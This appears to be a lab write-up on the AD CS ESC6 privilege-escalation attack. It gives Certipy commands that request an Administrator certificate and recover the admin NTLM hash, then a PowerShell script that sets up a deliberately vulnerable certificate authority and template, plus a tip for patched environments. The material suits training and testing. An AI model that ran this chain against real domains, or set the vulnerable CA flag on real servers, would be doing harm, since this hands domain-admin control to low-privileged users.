#

#

#

# Exploitation with CERTIPY
```powershell
# Scan Vulnerability Template
certipy-ad find -u 'test@certificate.local' -p 'sako2005!' \ 
    -dc-ip 192.168.0.150 -stdout -vulnerable

# Request Administrator .pfx
certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \  
    -dc-ip 192.168.0.150 -target 192.168.0.150 \
    -ca 'certificate-WIN-CERTIFICATE-CA' \
    -template 'VulnESC6' \
    -upn 'administrator@certificate.local'

# Get Admin NTLM Hash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip 192.168.0.150
```

# 

# Labaratory
```powershell
#Requires -RunAsAdministrator
<#
.SYNOPSIS
    ESC6 Vulnerable Lab Setup Script
    Creates a template:
      VulnESC6 -- CA is configured with EDITF_ATTRIBUTESUBJECTALTNAME2 flag

.DESCRIPTION
    The ESC6 vulnerability exists at the CA level, not in the template.
    When EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled, any template that allows
    enrollment can be used to request a certificate with a custom SAN,
    even if the template does not have ENROLLEE_SUPPLIES_SUBJECT set.
    A low-privileged user can request a certificate on behalf of Administrator.

    If permissions are insufficient, run as SYSTEM:
        PsExec64.exe -s -i powershell.exe .\Setup-ESC6Lab.ps1

.NOTES
    For authorized lab/testing use only.
#>

# -- Config -------------------------------------------------------------------

$TemplateName = "VulnESC6"
$TemplateOID  = "1.3.6.1.4.1.311.21.8.1417189.1978403.869562.7555284.2956879.9.1.600"
$EnrollGroup  = "Domain Users"

# -- Helpers ------------------------------------------------------------------

function Write-Step { param($msg) Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok   { param($msg) Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Fail { param($msg) Write-Host "[-] $msg" -ForegroundColor Red }
function Write-Warn { param($msg) Write-Host "[!] $msg" -ForegroundColor Yellow }

# -- Preflight ----------------------------------------------------------------

Write-Host ""
Write-Host "  ESC6 Lab Setup" -ForegroundColor Magenta
Write-Host "  --------------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Step "Checking environment..."

try {
    $configNC     = (Get-ADRootDSE).configurationNamingContext
    $templatePath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
    Write-Ok "Config NC: $configNC"
} catch {
    Write-Fail "Cannot reach AD. Is this a Domain Controller?"
    exit 1
}

# -- Cleanup existing template ------------------------------------------------

$existing = Get-ADObject -Filter { Name -eq $TemplateName } -SearchBase $templatePath -ErrorAction SilentlyContinue
if ($existing) {
    Write-Warn "Existing '$TemplateName' template found. Removing..."
    try {
        certutil -SetCATemplates -$TemplateName 2>$null | Out-Null
        Remove-ADObject "CN=$TemplateName,$templatePath" -Confirm:$false -ErrorAction Stop
        Write-Ok "Old '$TemplateName' template removed."
    } catch {
        Write-Fail "Could not remove '$TemplateName': $_"
        Write-Warn "Run as SYSTEM: PsExec64.exe -s -i powershell.exe .\Setup-ESC6Lab.ps1"
        exit 1
    }
}

# -- Create template ----------------------------------------------------------
# A normal-looking template with Client Auth EKU and no manager approval.
# ENROLLEE_SUPPLIES_SUBJECT is NOT set on the template.
# The vulnerability lives in the CA flag, not here.

Write-Step "Creating template: $TemplateName"

$attrs = @{
    "displayName"                          = $TemplateName
    "msPKI-Cert-Template-OID"              = $TemplateOID
    "msPKI-Certificate-Name-Flag"          = 0          # No ENROLLEE_SUPPLIES_SUBJECT (bypassed via CA flag)
    "msPKI-Enrollment-Flag"                = 0          # No manager approval
    "msPKI-Minimal-Key-Size"               = 2048
    "msPKI-Private-Key-Flag"               = 16         # Exportable
    "msPKI-RA-Signature"                   = 0
    "msPKI-Template-Schema-Version"        = 2
    "msPKI-Template-Minor-Revision"        = 0
    "msPKI-Certificate-Application-Policy" = "1.3.6.1.5.5.7.3.2"   # Client Authentication
    "pKIExtendedKeyUsage"                  = "1.3.6.1.5.5.7.3.2"   # Client Authentication
    "pKIDefaultKeySpec"                    = 1
    "pKIMaxIssuingDepth"                   = 0
    "pKIKeyUsage"                          = [byte[]]@(0x80, 0x00)
    "pKIDefaultCSPs"                       = "1,Microsoft Enhanced Cryptographic Provider v1.0"
    "pKIExpirationPeriod"                  = [byte[]]@(0x00, 0x40, 0x39, 0x87, 0x2e, 0x2b, 0xfe, 0xff)
    "pKIOverlapPeriod"                     = [byte[]]@(0x00, 0x80, 0xa6, 0x0a, 0xff, 0xff, 0xff, 0xff)
    "flags"                                = 131104
    "revision"                             = 100
}

try {
    New-ADObject -Name $TemplateName -Path $templatePath -Type "pKICertificateTemplate" `
                 -OtherAttributes $attrs -ErrorAction Stop
    Write-Ok "Template '$TemplateName' created."
} catch {
    Write-Fail "Failed to create template: $_"
    exit 1
}

# -- Grant Enroll to Domain Users ---------------------------------------------

Write-Step "Granting Enroll permission to '$EnrollGroup'..."

try {
    $acl  = Get-Acl "AD:\CN=$TemplateName,$templatePath"
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        [System.Security.Principal.NTAccount]$EnrollGroup,
        "ExtendedRight",
        "Allow"
    )
    $acl.AddAccessRule($rule)
    Set-Acl -Path "AD:\CN=$TemplateName,$templatePath" -AclObject $acl -ErrorAction Stop
    Write-Ok "Enroll permission granted to '$EnrollGroup'."
} catch {
    Write-Fail "Failed to set Enroll ACL: $_"
    exit 1
}

# -- Add template to CA -------------------------------------------------------

Write-Step "Adding '$TemplateName' to CA..."

$result = certutil -SetCATemplates +$TemplateName 2>&1
if ($LASTEXITCODE -eq 0) {
    Write-Ok "'$TemplateName' added to CA."
} else {
    Write-Warn "certutil failed, trying Add-CATemplate..."
    try {
        Add-CATemplate -Name $TemplateName -Force -ErrorAction Stop
        Write-Ok "'$TemplateName' added via Add-CATemplate."
    } catch {
        Write-Fail "Could not add '$TemplateName' to CA: $_"
        exit 1
    }
}

# -- ESC6 Core: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 -------------------------
#
#   This flag is written to the CA registry key:
#   HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA>\
#       PolicyModules\CertificateAuthority_MicrosoftDefault.Policy
#
#   Bit 0x00040000 (262144) is OR-ed into the EditFlags DWORD value.
#
#   When active:
#     - Any enrollment request may include a SAN field
#     - certipy req --upn administrator@domain passes the SAN in the CSR
#     - The CA issues the certificate with the attacker-supplied SAN

Write-Step "Enabling EDITF_ATTRIBUTESUBJECTALTNAME2 on CA (ESC6 misconfiguration)..."

$EDITF_FLAG = 0x00040000   # 262144

try {
    # -- Method 1: Read CA name directly from the CertSvc registry ----------------
    # This is the most reliable method -- no certutil parsing needed.
    # HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration
    # contains one subkey per installed CA, named exactly after the CA.

    $certSvcConfigPath = "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"
    $caShortName       = $null

    $caSubKeys = Get-ChildItem -Path $certSvcConfigPath -ErrorAction SilentlyContinue |
                 Where-Object { $_.PSChildName -ne "CAList" }

    if ($caSubKeys) {
        # Pick the first CA key found (labs typically have one CA)
        $caShortName = ($caSubKeys | Select-Object -First 1).PSChildName
        Write-Ok "CA name resolved from registry: $caShortName"
    }

    # -- Method 2: Parse certutil -getconfig output -------------------------------
    # certutil output format varies by OS locale.
    # Try both "Config:" and plain text matching as fallbacks.

    if (-not $caShortName) {
        Write-Warn "Registry method returned nothing, trying certutil -getconfig..."

        $certutilLines = certutil -getconfig 2>$null
        foreach ($line in $certutilLines) {
            # Match lines like:  Config: "SERVER\MyCA"  or  Config: SERVER\MyCA
            if ($line -match '(?i)config[^:]*:\s*"?([^"\\]+)\\([^"]+)"?') {
                $caShortName = $matches[2].Trim()
                Write-Ok "CA name resolved from certutil: $caShortName"
                break
            }
        }
    }

    # -- Method 3: ICertConfig COM object -----------------------------------------

    if (-not $caShortName) {
        Write-Warn "certutil parse failed, trying ICertConfig COM object..."
        try {
            $certConfig  = New-Object -ComObject CertificateAuthority.Config
            $fullConfig  = $certConfig.GetConfig(0)   # 0 = local CA
            if ($fullConfig -match "\\(.+)$") {
                $caShortName = $matches[1].Trim()
                Write-Ok "CA name resolved via COM: $caShortName"
            }
        } catch {
            Write-Warn "COM method failed: $_"
        }
    }

    # -- Abort if all methods failed ----------------------------------------------

    if (-not $caShortName) {
        Write-Fail "Could not determine CA name from any method."
        Write-Warn "Run:  certutil -getconfig"
        Write-Warn "Then set manually:  `$caShortName = 'YourCAName'"
        exit 1
    }

    $policyPath = "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\" +
                  "$caShortName\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy"

    if (-not (Test-Path $policyPath)) {
        Write-Fail "Policy registry path not found: $policyPath"
        Write-Warn "Listing available CA subkeys for diagnosis:"
        Get-ChildItem -Path $certSvcConfigPath -ErrorAction SilentlyContinue |
            ForEach-Object { Write-Host "    Found key: $($_.PSChildName)" -ForegroundColor DarkGray }
        exit 1
    }

    $currentFlags = (Get-ItemProperty -Path $policyPath -Name "EditFlags").EditFlags
    Write-Ok ("Current EditFlags: 0x{0:X8} ({0})" -f $currentFlags)

    if ($currentFlags -band $EDITF_FLAG) {
        Write-Warn "EDITF_ATTRIBUTESUBJECTALTNAME2 is already active."
    } else {
        $newFlags = $currentFlags -bor $EDITF_FLAG
        Set-ItemProperty -Path $policyPath -Name "EditFlags" -Value $newFlags -Type DWord -ErrorAction Stop
        Write-Ok ("EditFlags updated: 0x{0:X8} -> 0x{1:X8}" -f $currentFlags, $newFlags)
        Write-Ok "EDITF_ATTRIBUTESUBJECTALTNAME2 enabled."
    }
} catch {
    Write-Fail "Failed to set EditFlags: $_"
    Write-Warn "Run as SYSTEM: PsExec64.exe -s -i powershell.exe .\Setup-ESC6Lab.ps1"
    exit 1
}

# -- Restart CertSvc ----------------------------------------------------------

Write-Step "Restarting CertSvc (required for flag change to take effect)..."
Restart-Service -Name CertSvc -Force
Start-Sleep -Seconds 5
Write-Ok "CertSvc restarted."

# -- Verify flag --------------------------------------------------------------

Write-Step "Verifying CA flag via certutil..."
$certutilOut = certutil -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags 2>&1
$certutilOut | ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }

if ($certutilOut -match "EDITF_ATTRIBUTESUBJECTALTNAME2") {
    Write-Ok "Flag verified: EDITF_ATTRIBUTESUBJECTALTNAME2 is active."
} else {
    Write-Warn "Flag not confirmed -- check certutil output manually."
}

# -- Summary ------------------------------------------------------------------

$domain = (Get-ADDomain).DNSRoot
$dcIP   = (Resolve-DnsName $domain -Type A -ErrorAction SilentlyContinue | Select-Object -First 1).IPAddress

Write-Host ""
Write-Host "  --------------------------------------" -ForegroundColor DarkGray
Write-Host "  ESC6 Lab Ready" -ForegroundColor Green
Write-Host "  --------------------------------------" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Vulnerability  : EDITF_ATTRIBUTESUBJECTALTNAME2 enabled on CA" -ForegroundColor White
Write-Host "  Template       : $TemplateName (Client Auth, Domain Users can enroll)" -ForegroundColor White
Write-Host "  Impact         : Any enrollable template accepts attacker-supplied SAN" -ForegroundColor White
Write-Host ""
Write-Host "  Exploit (from Kali):" -ForegroundColor Yellow
Write-Host ""
Write-Host "  # Step 1 -- Discover the vulnerability with Certipy" -ForegroundColor DarkGray
Write-Host "  certipy find -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
Write-Host "      -dc-ip $dcIP -stdout -vulnerable" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 2 -- Request a certificate with Administrator UPN as SAN" -ForegroundColor DarkGray
Write-Host "  certipy req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
Write-Host "      -dc-ip $dcIP -target $dcIP \`" -ForegroundColor Cyan
Write-Host "      -ca '<CA-NAME>' -template '$TemplateName' \`" -ForegroundColor Cyan
Write-Host "      -upn 'administrator@$domain'" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 3 -- Authenticate with PKINIT" -ForegroundColor DarkGray
Write-Host "  certipy auth -pfx 'administrator.pfx' -dc-ip $dcIP" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 4 -- Restore the environment (optional)" -ForegroundColor DarkGray
Write-Host "  certutil -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2" -ForegroundColor Cyan
Write-Host "  Restart-Service CertSvc" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Note: Certipy v4+ detects ESC6 automatically." -ForegroundColor DarkGray
Write-Host "        Microsoft addressed this with KB5014754 (StrongCertificateBindingEnforcement)." -ForegroundColor DarkGray
Write-Host "        On patched environments use: certipy auth -ldap-shell" -ForegroundColor DarkGray
Write-Host ""
```
